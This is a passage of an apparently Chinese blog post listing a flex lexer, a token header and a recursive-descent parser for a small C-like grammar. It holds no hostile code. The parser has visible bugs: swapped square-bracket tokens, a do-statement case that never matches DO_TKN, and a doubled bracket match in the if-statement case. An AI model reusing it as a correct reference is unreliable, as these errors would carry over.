(IF_TKN); &#125;</span><br><span class="line"><span class="keyword">else</span>       &#123; <span class="built_in">printf</span>(<span class="string">"ELSE:%s\n"</span>,yytext); <span class="keyword">return</span> (ELSE_TKN); &#125;</span><br><span class="line"><span class="keyword">do</span>         &#123; <span class="built_in">printf</span>(<span class="string">"DO:%s\n"</span>,yytext); <span class="keyword">return</span> (DO_TKN); &#125;</span><br><span class="line"><span class="keyword">break</span>      &#123; <span class="built_in">printf</span>(<span class="string">"BREAK:%s\n"</span>,yytext); <span class="keyword">return</span> (BREAK_TKN); &#125;</span><br><span class="line"><span class="string">"int"</span>      &#123; <span class="built_in">printf</span>(<span class="string">"BASIC:%s\n"</span>,yytext); <span class="keyword">return</span> (BASIC_TKN); &#125;</span><br><span class="line"><span class="string">"char"</span>     &#123; <span class="built_in">printf</span>(<span class="string">"BASIC:%s\n"</span>,yytext); <span class="keyword">return</span> (BASIC_TKN); &#125;</span><br><span class="line"><span class="string">"bool"</span>     &#123; <span class="built_in">printf</span>(<span class="string">"BASIC:%s\n"</span>,yytext); <span class="keyword">return</span> (BASIC_TKN); &#125;</span><br><span class="line"><span class="string">"float"</span>    &#123; <span class="built_in">printf</span>(<span class="string">"BASIC:%s\n"</span>,yytext); <span class="keyword">return</span> (BASIC_TKN); &#125;</span><br><span class="line"><span class="keyword">while</span>      &#123; <span class="built_in">printf</span>(<span class="string">"WHILE:%s\n"</span>,yytext); <span class="keyword">return</span> (WHILE_TKN); &#125;</span><br><span class="line"><span class="keyword">for</span>        &#123; <span class="built_in">printf</span>(<span class="string">"FOR:%s\n"</span>,yytext); <span class="keyword">return</span> (FOR_TKN); &#125;</span><br><span class="line"></span><br><span class="line">&#123;number&#125;   &#123; <span class="built_in">printf</span>(<span class="string">"Num:%s\n"</span>,yytext); <span class="keyword">return</span> (NUM_TKN); &#125; </span><br><span class="line"></span><br><span class="line">\(         &#123; yylval = LEFT_BRACKET; <span class="built_in">printf</span>(<span class="string">"LEFT_BRACKET:%s\n"</span>,yytext);  <span class="keyword">return</span> (LEFT_BRACKET); &#125;</span><br><span class="line">\)         &#123; yylval = RIGHT_BRACKET; <span class="built_in">printf</span>(<span class="string">"RIGHT_BRACKET:%s\n"</span>,yytext);  <span class="keyword">return</span> (RIGHT_BRACKET); &#125;</span><br><span class="line">\]         &#123; yylval = LEFT_MIBRACKET; <span class="built_in">printf</span>(<span class="string">"LEFT_MIBRACKET:%s\n"</span>,yytext);  <span class="keyword">return</span> (LEFT_MIBRACKET); &#125;</span><br><span class="line">\[         &#123; yylval = RIGHT_MIBRACKET; <span class="built_in">printf</span>(<span class="string">"RIGHT_MIBRACKET:%s\n"</span>,yytext);  <span class="keyword">return</span> (RIGHT_MIBRACKET); &#125;</span><br><span class="line">\&#123;         &#123; yylval = LEFT_BIBRACKET; <span class="built_in">printf</span>(<span class="string">"LEFT_BIBRACKET:%s\n"</span>,yytext);  <span class="keyword">return</span> (LEFT_BIBRACKET); &#125;</span><br><span class="line">\&#125;         &#123; yylval = RIGHT_BIBRACKET; <span class="built_in">printf</span>(<span class="string">"RIGHT_BIBRACKET:%s\n"</span>,yytext);  <span class="keyword">return</span> (RIGHT_BIBRACKET); &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">";"</span>       &#123; yylval = RELOP_SENI; <span class="built_in">printf</span>(<span class="string">"SENI:%s\n"</span>,yytext);  <span class="keyword">return</span>(RELOP_SENI); &#125;</span><br><span class="line"><span class="string">","</span>       &#123; yylval = RELOP_COMMA; <span class="built_in">printf</span>(<span class="string">"COMMA:%s\n"</span>,yytext);  <span class="keyword">return</span>(RELOP_COMMA); &#125;</span><br><span class="line"></span><br><span class="line"><span class="string">"+"</span>        &#123; yylval = RELOP_AD; <span class="built_in">printf</span>(<span class="string">"AD:%s\n"</span>,yytext);  <span class="keyword">return</span>(RELOP_AD); &#125;</span><br><span class="line"><span class="string">"-"</span>        &#123; yylval = RELOP_SU; <span class="built_in">printf</span>(<span class="string">"SU:%s\n"</span>,yytext);  <span class="keyword">return</span>(RELOP_SU); &#125;</span><br><span class="line"><span class="string">"*"</span>        &#123; yylval = RELOP_MU; <span class="built_in">printf</span>(<span class="string">"MU:%s\n"</span>,yytext);  <span class="keyword">return</span>(RELOP_MU); &#125;</span><br><span class="line"><span class="string">"/"</span>        &#123; yylval = RELOP_DI; <span class="built_in">printf</span>(<span class="string">"DI:%s\n"</span>,yytext);  <span class="keyword">return</span>(RELOP_DI); &#125;</span><br><span class="line"></span><br><span class="line"><span class="string">"&lt;"</span>        &#123; yylval = RELOP_LT; <span class="built_in">printf</span>(<span class="string">"LT:%s\n"</span>,yytext);  <span class="keyword">return</span>(RELOP_TKN); &#125;</span><br><span class="line"><span class="string">"&lt;="</span>       &#123; yylval = RELOP_LE; <span class="built_in">printf</span>(<span class="string">"LE:%s\n"</span>,yytext);  <span class="keyword">return</span>(RELOP_TKN); &#125;</span><br><span class="line"><span class="string">"="</span>        &#123; yylval = RELOP_EQ; <span class="built_in">printf</span>(<span class="string">"EQ:%s\n"</span>,yytext);  <span class="keyword">return</span>(RELOP_TKN); &#125;</span><br><span class="line"><span class="string">"!="</span>       &#123; yylval = RELOP_NE; <span class="built_in">printf</span>(<span class="string">"NE:%s\n"</span>,yytext);  <span class="keyword">return</span>(RELOP_TKN); &#125;</span><br><span class="line"><span class="string">"&gt;"</span>        &#123; yylval = RELOP_GT; <span class="built_in">printf</span>(<span class="string">"GT:%s\n"</span>,yytext);  <span class="keyword">return</span>(RELOP_TKN); &#125;</span><br><span class="line"><span class="string">"&gt;="</span>       &#123; yylval = RELOP_GE; <span class="built_in">printf</span>(<span class="string">"GE:%s\n"</span>,yytext);  <span class="keyword">return</span>(RELOP_TKN); &#125;</span><br><span class="line"></span><br><span class="line">[\/][\*]([^\*])*[\*]([^\*\/](([^\*])*)[\*]|[\*])*(\/)  &#123; <span class="built_in">printf</span>(<span class="string">"备注:%s\n"</span>,yytext); &#125;</span><br><span class="line"></span><br><span class="line">&#123;id&#125;       &#123; <span class="built_in">printf</span>(<span class="string">"ID:%s\n"</span>,yytext); <span class="keyword">return</span> (ID_TKN); &#125;</span><br><span class="line">.          &#123; <span class="built_in">printf</span>(<span class="string">"TKN:%s\n"</span>,yytext); <span class="keyword">return</span> yytext[<span class="number">0</span>]; &#125;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="comment">/*辅助函数*/</span></span><br><span class="line"><span class="comment">/*该函数设置yyin变量，fflex对yyin变量所对应的文件进行词法分析*/</span></span><br><span class="line"><span class="comment">/*缺省情况下，yyin和yyout都指向标准输入和输出。*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BeginCompileOneFile</span><span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> * filename )</span></span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">   yyin = fopen( filename, <span class="string">"r"</span>);<span class="comment">//打开文件</span></span><br><span class="line">   fseek( yyin, <span class="number">0</span>, SEEK_SET );<span class="comment">//指针移到文件开头</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EndCompileOneFile</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   fclose(yyin);<span class="comment">//关闭</span></span><br><span class="line">   yyin = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*如果函数的返回值是1，就停止解析*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yywrap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetLineNo</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> lineNo;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*因为lex.yy.c是C语言写的，下面这些函数是以c语言的函数调用方式编译的的</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#ifdef __cplusplus</span></span><br><span class="line"><span class="comment">    extern "C" int yylex(void);</span></span><br><span class="line"><span class="comment">    extern "C" void BeginCompileOneFile( const char * filename );</span></span><br><span class="line"><span class="comment">    extern "C" void EndCompileOneFile( void);</span></span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">void main()</span></span><br><span class="line"><span class="comment">&#123; int token;</span></span><br><span class="line"><span class="comment">char filename[1000];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	printf("请输入要编译的源程序文件名："); gets(filename);</span></span><br><span class="line"><span class="comment">	BeginCompileOneFile( filename );</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	//当flex扫描到文件末尾，yylex函数返回0</span></span><br><span class="line"><span class="comment">    while( ( token = yylex() ) &gt; 0 ) ;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	EndCompileOneFile();</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	getchar();</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>
<h3 id="lex-yy-h"><a href="#lex-yy-h" class="headerlink" title="lex.yy.h"></a>lex.yy.h</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ID_TKN      500</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_TKN     510</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RELOP_TKN   520</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RELOP_AD    521</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RELOP_SU    522</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RELOP_MU    523</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RELOP_DI    524</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RELOP_LT    525</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RELOP_LE    526</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RELOP_EQ    527</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RELOP_NE    528</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RELOP_GT    529</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RELOP_GE    530</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RELOP_SENI    531</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RELOP_COMMA    532</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEFT_BRACKET  533</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RIGHT_BRACKET 534</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEFT_MIBRACKET  535</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RIGHT_MIBRACKET 536</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEFT_BIBRACKET  537</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RIGHT_BIBRACKET 538</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IF_TKN       610</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WHILE_TKN    611</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DO_TKN       612</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BREAK_TKN    613</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REAL_TKN     614</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRUE_TKN     615</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FALSE_TKN    616</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BASIC_TKN    617</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELSE_TKN     618</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOR_TKN 619</span></span><br></pre></td></tr></table></figure></div>
<h3 id="parser-cpp"><a href="#parser-cpp" class="headerlink" title="parser.cpp"></a>parser.cpp</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CPP"><figure class="iseeu highlight /cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"lex.yy.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function"><span class="keyword">void</span> <span class="title">BeginCompileOneFile</span><span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> * filename )</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function"><span class="keyword">void</span> <span class="title">EndCompileOneFile</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function"><span class="keyword">int</span> <span class="title">yylex</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function"><span class="keyword">int</span> <span class="title">GetLineNo</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> YELLOW <span class="meta-string">"\033[1;33m"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RED <span class="meta-string">"\033[1;31m"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NONE <span class="meta-string">"\033[m"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> lookahead;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">error</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">match</span><span class="params">(<span class="keyword">int</span> TokenID)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Program</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Block</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stmts</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stmt</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">else_part</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bool_</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Expr</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Expr_prime</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Term</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Term_prime</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Factor</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>	*yytext;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">error</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(RED <span class="string">"在%d行出现句法分析错误!\n"</span> NONE,GetLineNo());</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">match</span><span class="params">(<span class="keyword">int</span> TokenID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( lookahead == TokenID )</span><br><span class="line">    &#123;</span><br><span class="line">		lookahead = yylex();</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	<span class="built_in">printf</span>(RED <span class="string">"match error : yytext:%s  lookahead:%d  TokenID:%d\n"</span> NONE,yytext,lookahead,TokenID);</span><br><span class="line">    error();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Program</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( lookahead == LEFT_BIBRACKET ) &#123;</span><br><span class="line">	    <span class="built_in">printf</span>(YELLOW <span class="string">"Production:  program   →  block\n"</span> NONE);</span><br><span class="line">	    Block();</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="built_in">printf</span>(RED <span class="string">"Program error\n"</span> NONE);</span><br><span class="line">    error();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Block</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( lookahead==LEFT_BIBRACKET) &#123;</span><br><span class="line">	    <span class="built_in">printf</span>(YELLOW <span class="string">"Production:  block   →  &#123; stmts &#125;\n"</span> NONE);</span><br><span class="line">	    match( LEFT_BIBRACKET );</span><br><span class="line">        stmts();</span><br><span class="line">        match( RIGHT_BIBRACKET );</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(RED <span class="string">"Block error\n"</span> NONE);</span><br><span class="line">    error();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stmts</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   <span class="comment">/*如果lookahead是First(stmt stmts)中的一个终结符，那么stmts→stmt stmts可用*/</span></span><br><span class="line">    <span class="keyword">if</span>( lookahead==ID_TKN ||lookahead==IF_TKN ||</span><br><span class="line">		lookahead==WHILE_TKN ||lookahead==DO_TKN ||</span><br><span class="line">		lookahead==BREAK_TKN ||lookahead==LEFT_BIBRACKET ) &#123;</span><br><span class="line">	    <span class="built_in">printf</span>(YELLOW <span class="string">"Production:  stmts   →  stmt stmts\n"</span> NONE);</span><br><span class="line">	    stmt();</span><br><span class="line">	    stmts();</span><br><span class="line">	    <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( lookahead==RIGHT_BIBRACKET ) &#123; <span class="comment">/*如果lookahead是stmts的一个follow,那么stmts →　ε可用*/</span></span><br><span class="line">        <span class="built_in">printf</span>(YELLOW <span class="string">"Production:  stmts   →  ε\n"</span> NONE);</span><br><span class="line">	    <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">/*否则*/</span></span><br><span class="line">	<span class="built_in">printf</span>(RED <span class="string">"stmts error\n"</span> NONE);</span><br><span class="line">    error();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stmt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> ( lookahead )</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> ID_TKN:</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(YELLOW <span class="string">"Production:  stmt   →  id = expr;\n"</span> NONE);   </span><br><span class="line">		match( ID_TKN ); </span><br><span class="line">		match(RELOP_TKN); </span><br><span class="line">		Expr(); </span><br><span class="line">		match(RELOP_SENI);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">case</span> IF_TKN:</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(YELLOW <span class="string">"Production:  stmt   →  if (bool) stmt else_part\n"</span> NONE);    </span><br><span class="line">		match( IF_TKN ); </span><br><span class="line">		match(LEFT_BRACKET); </span><br><span class="line">		bool_(); </span><br><span class="line">		match( RIGHT_BRACKET ); </span><br><span class="line">		stmt(); </span><br><span class="line">		match(RIGHT_BRACKET); </span><br><span class="line">		else_part(); </span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">case</span> WHILE_TKN:</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(YELLOW <span class="string">"Production:  stmt   →  while (bool) stmt\n"</span> NONE);    </span><br><span class="line">		match( WHILE_TKN ); </span><br><span class="line">		match(LEFT_BRACKET); </span><br><span class="line">		bool_(); </span><br><span class="line">		match(RIGHT_BRACKET); </span><br><span class="line">		stmt(); </span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">case</span> DO_TKN:</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(YELLOW <span class="string">"Production:  stmt   →  do stmt while (bool);\n"</span> NONE);</span><br><span class="line">		stmt();</span><br><span class="line">		match( WHILE_TKN );</span><br><span class="line">		match(LEFT_BRACKET);</span><br><span class="line">		bool_();</span><br><span class="line">		match(RIGHT_BRACKET);</span><br><span class="line">		match(RELOP_SENI);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">case</span> BREAK_TKN:</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(YELLOW <span class="string">"Production:  stmt   →  break ;\n"</span> NONE);    </span><br><span class="line">		match( BREAK_TKN );</span><br><span class="line">		match(RELOP_SENI); </span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>( YELLOW <span class="string">"stmt   →  block\n"</span> NONE );</span><br><span class="line">		Block();</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">else_part</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/*如果lookahead是First(else stmt)中的一个终结符，那么else_part → else stmt可用*/</span></span><br><span class="line">	<span class="keyword">if</span> ( lookahead == ELSE_TKN )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>( YELLOW <span class="string">"else_part   →  else stmt\n"</span> NONE );</span><br><span class="line">		match( ELSE_TKN );</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>  <span class="keyword">if</span>( lookahead==ID_TKN ||lookahead==IF_TKN ||</span><br><span class="line">	lookahead==WHILE_TKN ||lookahead==DO_TKN ||</span><br><span class="line">	lookahead==BREAK_TKN ||lookahead==LEFT_BIBRACKET ||</span><br><span class="line">	lookahead==RIGHT_BIBRACKET)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/*follow(else_part)包含follow(stmt)包含follow(stmts)*/</span></span><br><span class="line">		<span class="comment">/*如果lookahead是else_part的一个follow,那么stmts →　ε可用*/</span></span><br><span class="line">		<span class="built_in">printf</span>( YELLOW <span class="string">"else_part   →  ε\n"</span> NONE );</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(RED <span class="string">"else_part error\n"</span> NONE);</span><br><span class="line">	error();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bool_</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Expr();</span><br><span class="line">	<span class="keyword">if</span>(lookahead==RELOP_TKN)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>( YELLOW <span class="string">"bool   →  expr relop expr\n"</span> NONE );</span><br><span class="line">		match( RELOP_TKN ); </span><br><span class="line">		Expr();</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(lookahead==RIGHT_BRACKET)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/*如果lookahead是bool的一个follow,那么bool → expr可用*/</span></span><br><span class="line">		<span class="built_in">printf</span>( YELLOW <span class="string">"bool   →  expr\n"</span> NONE );</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(RED <span class="string">"bool_ error\n"</span> NONE);</span><br><span class="line">	error();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Expr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(YELLOW <span class="string">"Production:  expr   →  term expr'\n"</span> NONE);</span><br><span class="line">	Term();</span><br><span class="line">	Expr_prime();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Expr_prime</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(lookahead==RELOP_AD)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(YELLOW <span class="string">"Production:  expr'   →  + term expr'\n"</span> NONE);</span><br><span class="line">		match( RELOP_AD ); Term(); Expr_prime();</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(lookahead==RELOP_SU)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(YELLOW <span class="string">"Production:  expr'   →  - term expr'\n"</span> NONE);</span><br><span class="line">		match( RELOP_SU ); Term(); Expr_prime();</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(lookahead==RELOP_SENI||lookahead==RIGHT_BRACKET||lookahead==RELOP_TKN)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/*follow(expr')*/</span></span><br><span class="line">		<span class="built_in">printf</span>(YELLOW <span class="string">"Production:  expr'   →  ε\n"</span> NONE);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(RED <span class="string">"Expr_prime error\n"</span> NONE);</span><br><span class="line">	error();	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Term</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(YELLOW <span class="string">"Production:  term   →  factor term'\n"</span> NONE);</span><br><span class="line">	Factor();</span><br><span class="line">	Term_prime();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Term_prime</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(lookahead==RELOP_MU)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(YELLOW <span class="string">"Production:  term'   →  * factor term'\n"</span> NONE);</span><br><span class="line">		match( RELOP_MU ); Factor();  Term_prime();</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(lookahead==RELOP_DI)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(YELLOW <span class="string">"Production:  term'   →  / factor term'\n"</span> NONE);</span><br><span class="line">		match( RELOP_DI ); Term(); Term_prime();</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(lookahead==RELOP_AD||lookahead==RELOP_SU||lookahead==RELOP_TKN||</span><br><span class="line">	   lookahead==RELOP_SENI||lookahead==RIGHT_BRACKET)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/*follow(term')=&#123;first(expr')-ε&#125;U&#123;follow(expr')&#125;*/</span></span><br><span class="line">		<span class="built_in">printf</span>(YELLOW <span class="string">"Production:  term'   →  ε\n"</span> NONE);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(RED <span class="string">"Term_prime error"</span> NONE);</span><br><span class="line">	error();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Factor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span 